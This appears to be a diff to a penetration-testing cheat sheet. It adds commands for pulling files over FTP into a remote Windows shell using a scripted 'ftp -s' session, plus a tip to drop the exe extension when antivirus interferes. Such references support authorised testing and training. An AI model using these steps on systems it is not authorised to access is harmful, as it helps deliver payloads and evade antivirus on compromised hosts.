@@ -104,9 +104,25 @@ New-PSDrive -Name "LocalMountedFolder" -PSProvider "FileSystem" -Root "\\<IP>\<S
 
 ###### FTP
 
+To download file interactively:
+
 ```
 ftp -A <SERVERIP>
 ```
+
+Paste the following commands into a remote Windows shell and download files over FTP non-interactively (replace <USERNAME> by anonymous if using anonymous login):
+
+```
+echo open <IP> <PORT> > ftp.txt
+echo USER <USERNAME> >> ftp.txt
+echo <PASSWORD> >> ftp.txt
+echo bin >> ftp.txt
+echo GET <FILENAME> >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+```
+
+In case of AV errors while trying binary, omit the exe extension.  
 
 ###### TFTP
 
